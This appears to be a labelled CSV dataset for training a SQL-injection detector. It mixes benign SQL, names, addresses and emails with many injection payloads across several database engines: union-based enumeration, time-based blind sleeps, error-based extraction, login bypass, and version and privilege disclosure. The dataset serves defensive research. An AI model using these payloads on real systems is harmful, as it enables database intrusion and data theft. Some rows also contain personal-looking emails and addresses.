Query,Label
SELECT * FROM  ( SELECT rhythm FROM layers ) ,0
SELECT * FROM nervous WHERE burn  BETWEEN 10 AND 20,0
"INSERT INTO giving  ( rod, simplest, dot )  VALUES  ( 'court', 'badly', 'plain' )  ",0
1'||  (  select 'kyhs' from dual where 9491  =  9491,1
SELECT * FROM club FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM rocket,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",1
8.2197E+15,0
1'  ) ,1
SELECT * FROM yellow WHERE fill BETWEEN neighborhood09/01/1996free AND than15/31/1996they,0
SELECT * FROM guess WHERE reach BETWEEN '1996-07-01' AND '1996-07-31',0
"-5082   )    )    union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#",1
de78e24423n6e,0
SELECT quite ( s )  FROM tip UNION,0
-4828%'  )   or 8678  =  5745#,1
"logroo, 98, 5-d",0
"1  )   and elt  (  7425  =  8842,8842  )   and   (  9194  =  9194",1
"1""   )    )     )   union all select null,null,null,null,null,null,null#",1
SELECT * FROM neck WHERE properly = 'struck' LIMIT 3,0
SELECT * FROM coal WHERE foot = 'above' FETCH FIRST 3 ROWS ONLY,0
"1""  )   where 1392  =  1392 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
" select * from users where id  =  '1' or \<\. union select 1,@@VERSION -- 1'",1
"1  )   as cfnz where 6065  =  6065 union all select null,null,null,null,null,null,null,null,null#",1
""" or """" """,1
dra2atizar,0
6.02828E+15,0
SELECT * FROM individual WHERE situation NOT LIKE 'ship%',0
"1%'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  '%'  =  '",1
SELECT stomach ( s )  FROM attached SELECT supply ( s ) ,0
SELECT * FROM bat  WHERE built = few,0
admin' or '1'  =  '1,1
SELECT COUNT ( DISTINCT grown )  FROM until,0
SELECT * FROM  ( SELECT leather FROM drive ) ,0
1  )   as ilqx where 8547  =  8547,1
SELECT * FROM but WHERE plastic NOT LIKE '[market]%',0
"-2821""   )    )     )   union all select 3920,3920,3920,3920,3920,3920,3920#",1
"  SELECT scaredID AS ID, jungle AS rice FROM carefully",0
"-2916""   )    )    or 4946  =  8232--",1
"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  9509  =  9509",1
"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'gtov' like 'gtov",1
3o7za732,0
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1
SELECT TOP 3 * FROM certainly,0
DELETE FROM difference,0
SELECT baseball ( s )  FROM consist FULL OUTER JOIN,0
acr7m6nia,0
SELECT * FROM around FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM certainly,0
select case when 6555  =  7349 then 1 else null end--,1
-5764 or 3038  =  3038,1
" SELECT * FROM being ORDER BY said ASC, coal DESC",0
SELECT COUNT ( birds ) FROM wish,0
SELECT * FROM let,0
7118,0
SELECT * FROM single,0
"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  -- ofqd",1
"-8007' where 9649  =  9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--",1
"  SELECT REPEAT ( ""SQL Tutorial"", 3 ) ;",0
7.85716E+15,0
SELECT * FROM kept WHERE ability BETWEEN '1996-07-01' AND '1996-07-31',0
"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",1
"1%""  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""%""  =  """,1
lagunaseca,0
"1%' union all select null,null,null,null,null,null,null,null--",1
poma gozalbo,0
 (  1589  =  1589  )  *1,1
1'+  (  select 'zjvx' where 4683  =  4683 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 29420 )  ORDER BY meta_id ASC",0
-2039'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 5940 )  ORDER BY meta_id ASC",0
"1'||  (  select 'tdcr' where 6792  =  6792 union all select null,null,null,null,null#",1
woolgar@awat.gov,0
SELECT * FROM thy,0
"   SELECT Employees.one, COUNT ( Orders.wolfID )  AS signFROM    ( OrdersINNER JOIN tent ON Orders.exampleID  =  Employees.lastID ) ",0
fest lairigoyen,0
-6145 or   (  8459  =  8459  )  *4906-- yklv,1
vasilescu.lisi@drogasvirtuales.sc,0
SELECT * FROM simply WHERE hurried NOT LIKE 'alphabet%',0
SELECT * FROM glass FETCH FIRST 3 ROWS ONLY,0
1 where 5700  =  5700,1
02314635f,0
1' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1
"-7916'   )    )    union all select 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",1
"  SELECT * FROM glass WHERE topic NOT IN  ( 'tell', 'mouth', 'typical' )  ",0
"1"" and elt  (  2373  =  5817,5817  )   and ""rsdt""  =  ""rsdt",1
"1""  )   as crek where 6570  =  6570 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
-1217'   )    )     )   order by 1#,1
SELECT * FROM rate WHERE same BETWEEN 'two' AND 'congress',0
FROM  ( SELECT DISTINCT tongue FROM settle ) ,0
SELECT * FROM kept WHERE also NOT LIKE '[primitive]%',0
rapetto picabea,0
SELECT * FROM giant FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM sure,0
albertini_trauberg@theroxyblue.jo,0
"-1512 union all select 9013,9013,9013,9013#",1
ren,0
m9gnificen5i5,0
hole@chicashumedas.at,0
1  )   where 6116  =  6116 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
calle benifallim 97 10?e,0
"  SELECT MAKEDATE ( 2017, 3 ) ;",0
"  SELECT Orders.againrID, Employees.might, Employees.religious FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.fightID ORDER BY Orders.structureID",0
mcanally@rockefeller.bt,0
12230,0
cea,0
SELECT * FROM slowly,0
"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'lvck'  =  'lvck",1
"  (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1
"calle artigako haritza, s/n 8?d",0
seno,0
DELETE FROM would WHERE officer = 'lying',0
SELECT COUNT ( especially )  FROM nodded,0
"calle puebla de los infantes, 145",0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c82f1dbb24' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
ag-uzadura,0
5140,0
"   SELECT rapidly, carefully, voyage FROM simply WHERE seems  IS NULL",0
"iif  (  9190  =  5059,1,1/0  )  ",1
SELECT Count ( * )  AS fur,0
SELECT COUNT ( map ) FROM buy,0
llanes,0
"  SELECT are AS rod, fence AS [worker]  FROM swung",0
SELECT * FROM hand WHERE fire BETWEEN motor09/01/1996yesterday AND policeman15/31/1996industrial,0
1 and 4595  =  4595#,1
1' where 8159  =  8159 union all select null#,1
SELECT AVG ( Price ) FROM cap,0
"-9764' where 1266  =  1266 or elt  (  4069  =  6162,6162  )  --",1
1'  )   where 9516  =  9516,1
SELECT * FROM order WHERE but = 'piano' LIMIT 3,0
SELECT * FROM essential,0
"  SELECT * FROM planning WHERE loud IN  ( 'under', 'way', 'imagine' )  ",0
"  SELECT fall,empty FROM language WHERE darkness = 'distant' UNION SELECT way, never FROM made",0
"-8838""   )    )    as xisn where 2749  =  2749 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1
tsoucas,0
"  SELECT * FROM mean WHERE zipper IN  ( 'herd', 'prove', 'valley' )  ",0
SELECT COUNT ( due ) FROM finger,0
56597686e,0
"1%""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
8.42194E+15,0
SELECT * FROM  ( SELECT gift FROM behind ) ,0
"  SELECT * FROM private WHERE cast NOT IN  ( 'those', 'roar', 'crowd' )  ",0
SELECT * FROM program WHERE Price NOT BETWEEN 10 AND 20,0
"   SELECT COUNT ( favorite ) , automobile FROM blow BY bring",0
3040,0
48di48l92,0
mara,0
jarad,0
-5861'  )   or 1581  =  2611 and   (  'mvjh' like 'mvjh,1
19127,0
-9668'   )    )    as orfu where 5822  =  5822 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
80,0
SELECT * FROM forgotten  WHERE needs NOT LIKE '[creature]%',0
SELECT * FROM charge WHERE vessels BETWEEN property09/01/1996hearing AND coffee15/31/1996year,0
vildo@prensahp.fj,0
1%'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
"1'+  (  select 'asdq' where 4023  =  4023 and make_set  (  8403  =  8403,8899   )    )   +'",1
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- xwoo,1
select * from users where id  =  1 <@1$ or 1  =  1 -- 1,1
"-9634'   )    )     )   union all select 4141,4141#",1
" select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1",1
couri-manahan@copiar.com.fm,0
SELECT * FROM limited,0
"  SELECT circleID AS ID, stove AS headed FROM thing",0
"-4797' union all select 8223,8223,8223,8223,8223,8223,8223,8223#",1
" SELECT * FROM machine ORDER BY range, eight",0
levi@coivoco.gr,0
DELETE FROM yes WHERE sheep = 'porch',0
SELECT * FROM color,0
padiernos,0
1;SELECT *,1
select   (  case when   (  7822  =  4430  )   then 7822 else 1/  (  select 0  )   end  )  --,1
SELECT * FROM improve FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM gift,0
ngoc,0
"1 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1'  )   as omtb where 1183  =  1183 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1
trixy,0
"select * from generate_series  (  2317,2317,case when   (  2317  =  9706  )   then 1 else 0 end  )   limit 1--",1
"  SELECT machinery,add FROM army WHERE wife = 'brown' UNION SELECT information, ready FROM one",0
arimany aguila,0
SELECT * FROM tea WHERE symbol = 'paper',0
carbonell calvet,0
"  SELECT * FROM rather WHERE anything IN  ( 'doctor', 'examine', 'well' )  ",0
SELECT * FROM vegetable WHERE by = 'wonderful' LIMIT 3,0
 ,1
30827206f,0
" select * from users where id  =  1 or "";["" or 1  =  1 -- 1",1
"1%""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""%""  =  """,1
"  SELECT pleaseID AS ID, wherever AS uncle FROM boat",0
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1
SELECT * FROM perfectly WHERE canal = 'sum'  AND City = 'belt',0
SELECT * FROM certain FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM system,0
"calle miquel santandreu 66,",0
vargas bentos,0
26562587w,0
"1%'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  '%'  =  '",1
cubillos del sil,0
"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",1
"-5054%""   )    )     )   union all select 8263,8263,8263,8263--",1
1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  7015  =  7015,1
"INSERT INTO example  ( count, from, nor )  VALUES  ( 'blew', 'farm', 'silence' )  ",0
"1'||  (  select 'nvrq' from dual where 4337  =  4337 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",1
"-4194""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""ddbc"" like ""ddbc",1
4.43607E+15,0
tiramollar,0
7.40029E+15,0
"1""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""bely""  =  ""bely",1
"SELECT LPAD ( ""SQL Tutorial"",   20, ""ABC"" ) ;",0
SELECT * FROM pen FETCH FIRST 50 PERCENT ROWS ONLY,0
select   (  case when   (  3672  =  8360  )   then 3672 else 3672*  (  select 3672 from information_schema.character_sets  )   end  )  #,1
SELECT MIN ( cannot )  AS herd FROM drew,0
"1%""   )    )    union all select null,null,null,null--",1
SELECT * FROM entire FETCH FIRST 50 PERCENT ROWS ONLY,0
"  SELECT brass,value,frighten FROM process LEFT JOIN Orders ON rule.joinID =  send.model ORDER BY underline.dinner",0
detlefsen albornoz,0
SELECT student ( s )  FROM ball UNION,0
48042322z,0
"1'   )    )    as efmy where 7299  =  7299 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"INSERT INTO town  ( continued, order, would )  VALUES  ( 'sell', 'cake', 'industrial' )  ",0
"-8976%""   )    )     )   union all select 5146,5146,5146,5146,5146,5146,5146,5146--",1
evarist arnus 5 11-d,0
"iif  (  9134  =  5736,1,1/0  )  ",1
bevis,0
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1
SELECT Count ( * )  AS official,0
"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",1
hoeflich@movil-google.cx,0
1  )   where 6150  =  6150,1
SELECT furniture FROM ants,0
"   SELECT highest, grandmother+ ', ' + beat+ ' ' + pole+ ', ' + shop AS castle  FROM verb",0
"minguez, 98",0
roda deita,0
"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
SELECT * FROM most WHERE born NOT BETWEEN 'ear' AND 'afternoon',0
pa24dan3cea,0
1.62177E+15,0
SELECT * FROM modern 3 SELECT * FROM post,0
47639,0
SELECT * FROM  ( SELECT hand FROM situation ) ,0
" SELECT column_name ( s )  FROM meal,happened",0
1'||  (  select 'brde' where 7390  =  7390 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',1
calle tras do colexio s/n,0
85802086b,0
"-4287%""   )    )    union all select 9074,9074,9074,9074,9074,9074,9074,9074,9074,9074#",1
"1' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'bwrb' like 'bwrb",1
"   SELECT given, scale, chainFROM if WHERE ship  IS NOT NULL",0
"SELECT t.*, tt.*, tr.object_id FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id INNER JOIN wp_term_relationships AS tr ON tr.term_taxonomy_id  =  tt.term_taxonomy_id WHERE tt.taxonomy IN  ( 'support_cat' )  AND tr.object_id IN  ( 262310, 262326, 262328 )  ORDER BY t.name ASC",0
santibez el bajo,0
SELECT * FROM goes FETCH FIRST 3 ROWS ONLY,0
"1%'   )    )    union all select null,null,null,null,null,null,null,null--",1
SELECT * FROM street 3,0
"  SELECT seriousID AS ID, law AS doll FROM view",0
 or '1'   =   '1,1
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'support_cat' )  AND t.term_id IN  (  2637  ) ",0
"1%'  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
" select * from users where id  =  1 or 1#""1 union select null,version  (    )   -- 1",1
"  SELECT rich AS involved, seems AS [win]  FROM eye",0
1' rlike   (  select   (  case when   (  6855  =  1056  )   then 1 else 0x28 end   )    )    and 'pmrz' like 'pmrz,1
"1%'   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
DELETE FROM bow,0
"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'pded'  =  'pded",1
"  SELECT blueID AS ID, seven AS classroom FROM acres",0
divinizacin,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
"1"" where 8978  =  8978 union all select null,null,null,null,null,null,null,null--",1
mocej*n,0
"INSERT INTO double ( visitor, sure, donkey, nuts, soldier, press )  VALUES  ( 'handle', 'off'. horn', 'brave', 'thirty', 'square', 'stove' )  ",0
"INSERT INTO six  ( solid, automobile, wore )  VALUES  ( 'hope', 'leather', 'smallest' )  ",0
SELECT fix FROM air UNION ALL SELECT national FROM pale ORDER BY cat,0
7stambrar,0
SELECT * FROM biggest WHERE entirely BETWEEN lay09/01/1996flight AND curious15/31/1996limited,0
barreras de la bandera,0
"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz",1
"1""   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""duuw""  =  ""duuw",1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  ""%""  =  """,1
masferr massans,0
SELECT * FROM nothing WHERE treated BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT become ( s )  FROM imagine,0
" select * from users where id  =  1 union select @<@.,version  (    )   -- 1",1
SELECT * FROM alike WHERE sudden = 'immediately',0
egido s/n,0
-6015%'  )   order by 1--,1
"1  )   where 2678  =  2678 union all select null,null,null,null,null,null,null,null,null#",1
"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",1
SELECT * FROM composition ORDER BY enough,0
doralie,0
"1""  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
-7979'+  (  select 'bkvt' where 3613  =  3613 union all select 3613#,1
"-3109"" or elt  (  1032  =  1032,3623  )  ",1
"1  )   as ezje where 5234  =  5234 and make_set  (  8403  =  8403,8899  )  --",1
SELECT * FROM gone WHERE automobile = 'smaller' LIMIT 3,0
SELECT * FROM dog WHERE replied = 'golden' LIMIT 3,0
55585768n,0
"1   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1""  )   as ucex where 5148  =  5148 order by 1#",1
"-1763""  )   or elt  (  1032  =  1032,3623  )   and   (  ""nqvv""  =  ""nqvv",1
"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'xwsb'  =  'xwsb",1
SELECT * FROM letter WHERE Price NOT BETWEEN 10 AND 20,0
"  SELECT pilotID AS ID, duty AS middle FROM concerned",0
1'  )   where 2120  =  2120,1
"calle jose canovas pujante, 106 8g",0
"1%""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT diagram ( s FROM actual RIGHT JOIN,0
alternat,0
-3677'   )    )    or 1939  =  4484,1
-4892%'   )    )    or 2251  =  9881--,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 193 )  ORDER BY meta_id ASC",0
DELETE FROM drew WHERE change = 'determine',0
"1%""  )   and elt  (  4249  =  4249,7259  )   and   (  ""%""  =  """,1
"-5857%""   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,1
SELECT * FROM north,0
1'  )   as lgex where 4068  =  4068 and 1378  =  9247--,1
"1 where 2988  =  2988 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1""  )   where 6859  =  6859 union all select null,null,null,null,null,null,null,null#",1
1'||  (  select 'exls' where 3837  =  3837 and sleep  (  5   )    )   ||',1
"1  )   as khkv where 2944  =  2944 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
6.96678E+15,0
"-9749"" where 7083  =  7083 or make_set  (  7577  =  1182,1182  )  --",1
SELECT * FROM read WHERE NOT high = 'cowboy'  AND NOT water = 'wore',0
 UPDATE broken SET may = 'universe'WHERE managed = 'dress',0
"1"" where 9173  =  9173 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",1
1' in boolean mode  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  #,1
"  SELECT milkID AS ID, at AS spin FROM object",0
paracuellos de jarama,0
SELECT * FROM loose WHERE section = 'border' LIMIT 3,0
"1' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'yfkk'  =  'yfkk",1
